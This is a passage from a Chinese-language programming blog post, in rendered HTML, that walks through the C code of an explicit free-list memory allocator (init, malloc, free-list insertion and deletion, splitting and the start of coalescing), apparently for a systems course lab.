~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp) ((char *)(bp)-3 * WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - 4 * WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// free block运算：计算当前block的“NEXT&quot;指针域</span></span><br><span class="line"><span class="comment">// bp:当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_PTR(bp) ((char *)(bp)-2 * WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_PTR(bp) ((char *)(bp)-WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// free block运算： 计算下一个free block的payload首地址</span></span><br><span class="line"><span class="comment">// bp:当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_FREE_BLKP(bp) ((char *)(*(unsigned int *)(NEXT_PTR(bp))))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_FREE_BLKP(bp) ((char *)(*(unsigned int *)(PREV_PTR(bp))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// virtual address计算：计算下一个block的payload首地址</span></span><br><span class="line"><span class="comment">// bp: 当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp) ((char *)(bp)-GET_SIZE(HDRP(bp) - WSIZE))</span></span><br></pre></td></tr></table></figure><p>可以看到, 基本上和implicit的宏差不多, 只是多了NEXT_FREE_BLKP这类宏, 由于调整了每个block的具体layout(多了next和prev), 所以一些运算,如HDRP等需要对应调整.</p><p>然后就是各个函数:</p><blockquote><p>NOTE: 再次注意存在逻辑空间和虚拟地址空间两个空间.</p></blockquote><h3 id="mm-init-1"><a href="#mm-init-1" class="headerlink" title="mm_init"></a>mm_init</h3><p>这个函数的主要工作包括:</p><ol><li>分配 一个word+ MIN_BLOCK</li><li>第一个word是做pad用,用于保证后续分配的block能够8字节对齐,和implicit一样.</li><li>后面的MIN_BLOCK用于作为free_list_head, 和impilicit的序言块作用相同</li><li>最后分配一个CHUNK,分配函数的内部会将这个chunk块插入到free list 中.</li></ol><p>整体来说,explicit的mm_init和implicit的mm_init作用相同,但是组织方式发生了一些变化.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 申请一个块，用于存放root指针</span></span><br><span class="line">    <span class="keyword">char</span> *init_block_p;</span><br><span class="line">    <span class="keyword">if</span> ((init_block_p = mem_sbrk(MIN_BLOCK + WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    init_block_p = (<span class="keyword">char</span> *)(init_block_p) + WSIZE; <span class="comment">// 跳过首个对齐块</span></span><br><span class="line"></span><br><span class="line">    free_list_head = init_block_p + <span class="number">3</span> * WSIZE;</span><br><span class="line">    PUT(PREV_PTR(free_list_head), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(NEXT_PTR(free_list_head), <span class="literal">NULL</span>); <span class="comment">// 初始化root指针为NULL（0）</span></span><br><span class="line">    PUT(HDRP(free_list_head), PACK(MIN_BLOCK, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(free_list_head), PACK(MIN_BLOCK, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extend the empty heap with a free block of CHUNKSIZE bytes</span></span><br><span class="line">    <span class="keyword">if</span> ((allocate_from_chunk(CHUNKSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allocate-from-heap"><a href="#allocate-from-heap" class="headerlink" title="allocate_from_heap"></a>allocate_from_heap</h3><p>allocate_from_heap做的工作很简单, 扩展heap大小, 然后将扩展出来的block插入到free_lilst中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 扩展heap,并分配满足当前需求的块到free_list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size  需求size 字节为单位</span></span><br><span class="line"><span class="comment"> * @return void*  成功：当前能够分配的块的首地址</span></span><br><span class="line"><span class="comment"> *                失败： NULL， 一般只在run out out memory时才会NULL </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">allocate_from_heap</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *cur_bp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> extend_size = MAX(size, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((cur_bp = extend_heap(extend_size / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入到free list中</span></span><br><span class="line">    insert_to_free_list(cur_bp);</span><br><span class="line">    <span class="keyword">return</span> cur_bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend-heap-1"><a href="#extend-heap-1" class="headerlink" title="extend_heap"></a>extend_heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 扩展当前heap</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param words  需要扩展的words, 字为单位</span></span><br><span class="line"><span class="comment"> * @return void* 当前可用块的payload首地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bp = (<span class="keyword">char</span> *)(bp) + <span class="number">3</span> * WSIZE; <span class="comment">// point to payload</span></span><br><span class="line">    <span class="comment">// set 本块信息</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="insert-to-free-list"><a href="#insert-to-free-list" class="headerlink" title="insert_to_free_list"></a>insert_to_free_list</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将free block插入到free list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp free block的payload的首个地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insert_to_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *head = free_list_head;</span><br><span class="line">    <span class="keyword">void</span> *p = NEXT_FREE_BLKP(head); <span class="comment">// 当前首个有效节点 或者 NULL</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(head), bp);</span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), head);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 更新当前要插入的节点</span></span><br><span class="line">        PUT(NEXT_PTR(bp), p);</span><br><span class="line">        PUT(PREV_PTR(bp), head);</span><br><span class="line">        <span class="comment">// 更新head</span></span><br><span class="line">        PUT(NEXT_PTR(head), bp);</span><br><span class="line">        <span class="comment">// 更新p节点(原首有效节点)</span></span><br><span class="line">        PUT(PREV_PTR(p), bp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用LIFO策略,将bp所指向的block插入到free_list中.</p><h3 id="mm-malloc-1"><a href="#mm-malloc-1" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>注释中说了本函数的工作. 首先从free_list中看有没有适合的块, 否则从heap中分配.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc, 根据 size 返回一个指针，该指针指向这个block的payload首地址</span></span><br><span class="line"><span class="comment"> * 主要工作：</span></span><br><span class="line"><span class="comment"> * 1. size的round操作，满足最小块需求以及对齐限制</span></span><br><span class="line"><span class="comment"> * 2. 首先检查当前free list中是否有可以满足 asize(adjusted size) ，有则place，（place可能需要split),无则第3步</span></span><br><span class="line"><span class="comment"> * 3. 从当前heap中分配新的free block， 插入到free list中，然后place</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">// Adjusted block size</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step1: round size 满足最小块和对齐限制</span></span><br><span class="line">    asize = ALIGN(<span class="number">2</span> * DSIZE + size); <span class="comment">// 2*DSIZE = header+ footer + next + prev</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// step2: 从free list 中找free block</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;  <span class="comment">//free list中找不到</span></span><br><span class="line">        <span class="comment">// step3: 从当前heap中分配</span></span><br><span class="line">        <span class="keyword">if</span> ((bp = allocate_from_heap(asize)) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc\n&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find-fit-1"><a href="#find-fit-1" class="headerlink" title="find_fit"></a>find_fit</h3><p>从free list中找到第一个满足需求size的free block并返回该block的payload首地址.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 使用first-fit policy</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* 成功，返回可用块的首地址</span></span><br><span class="line"><span class="comment"> *               失败，返回NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_FREE_BLKP(free_list_head); bp != <span class="literal">NULL</span> &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_FREE_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)) == <span class="number">0</span> &amp;&amp; size &lt;= GET_SIZE(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="place-1"><a href="#place-1" class="headerlink" title="place"></a>place</h3><p>本函数实现,将bp所指向的free block在可能的情况下做split.具体来说,是当当前free block的size &gt;= 请求size+最小block时会做split.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief place block</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> origin_size;</span><br><span class="line">    <span class="keyword">size_t</span> remain_size;</span><br><span class="line"></span><br><span class="line">    origin_size = GET_SIZE(HDRP(bp));</span><br><span class="line">    remain_size = origin_size - size;</span><br><span class="line">    <span class="keyword">if</span> (remain_size &gt;= MIN_BLOCK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可拆分</span></span><br><span class="line">        <span class="comment">// 设置拆分后剩下的块的size和allocate情况</span></span><br><span class="line">        <span class="keyword">char</span> *remain_blockp = (<span class="keyword">char</span> *)(bp) + size;</span><br><span class="line">        PUT(HDRP(remain_blockp), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(remain_blockp), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 更新指针，将剩下块加入到free list中</span></span><br><span class="line">        <span class="keyword">char</span> *prev_blockp = PREV_FREE_BLKP(bp);</span><br><span class="line">        <span class="keyword">char</span> *next_blockp = NEXT_FREE_BLKP(bp);</span><br><span class="line">        PUT(NEXT_PTR(remain_blockp), next_blockp);</span><br><span class="line">        PUT(PREV_PTR(remain_blockp), prev_blockp);</span><br><span class="line">        PUT(NEXT_PTR(prev_blockp), remain_blockp);</span><br><span class="line">        <span class="keyword">if</span> (next_blockp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            PUT(PREV_PTR(next_blockp), remain_blockp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置分配的块</span></span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 断开原block与free list的连接</span></span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 不可拆分</span></span><br><span class="line">        <span class="comment">// 更新header和footer</span></span><br><span class="line">        PUT(HDRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 移除free block from free list</span></span><br><span class="line">        delete_from_free_list(bp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="delete-from-free-list"><a href="#delete-from-free-list" class="headerlink" title="delete_from_free_list"></a>delete_from_free_list</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 从free list中删除 bp 所在节点</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_from_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *prev_free_block = PREV_FREE_BLKP(bp);</span><br><span class="line">    <span class="keyword">void</span> *next_free_block = NEXT_FREE_BLKP(bp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next_free_block == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_block), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_block), next_free_block);</span><br><span class="line">        PUT(PREV_PTR(next_free_block), prev_free_block);</span><br><span class="line">        <span class="comment">// 断开连接</span></span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-free-1"><a href="#mm-free-1" class="headerlink" title="mm_free"></a>mm_free</h3><p>这里的free函数和implicit list的free函数一致,重点在coalesce函数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(ptr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free\n&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="coalesce-1"><a href="#coalesce-1" class="headerlink" title="coalesce"></a>coalesce</h3><p>coalesce是每种分配器的重点,需要考虑如何合并在虚拟地址空间中的相邻blocks之间的关系, 和implicit一样,explicit也有4种情况:</p><p><img data-src="https://pic.downk.cc/item/5f466750160a154a6795783c.png" alt="image-20200826214359077"></p><p><img data-src="https://pic.downk.cc/item/5f46675f160a154a67957e67.png" alt="image-20200826214409356"></p><p><img data-src="https://pic.downk.cc/item/5f466771160a154a6795847c.png" alt="image-20200826214415780"></p><p><img data-src="https://pic.downk.cc/item/5f46677a160a154a679586f3.png" alt="image-20200826214426686"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 合并地址空间，并将可用free block插入到free list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp 当前block的payload首地址</span></span><br><span class="line"><span class="comment"> *           </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *next_blockp = NEXT_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *mem_max_addr = (<span class="keyword">char</span> *)mem_heap_hi() + <span class="number">1</span>; <span class="comment">// heap的上边界</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(HDRP(prev_blockp));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next_blockp &gt;= mem_max_addr)</span><br><span class="line">    &#123; <span class="comment">// next_block超过heap的上边界，只用考虑prev_blockp</span></span><br><span class="line">        <span class="keyword">if</span> (!prev_alloc)</span><br><span class="line">        &#123;</span><br><span class="line">            case3(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            case1(bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        next_alloc = GET_ALLOC(HDRP(next_blockp));</span><br><span class="line">        <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">        &#123; <span class="comment">// case 1: 前后都已经分配</span></span><br><span class="line">            case1(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">        &#123; <span class="comment">//case 3: 前未分配，后分配</span></span><br><span class="line">            case3(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; 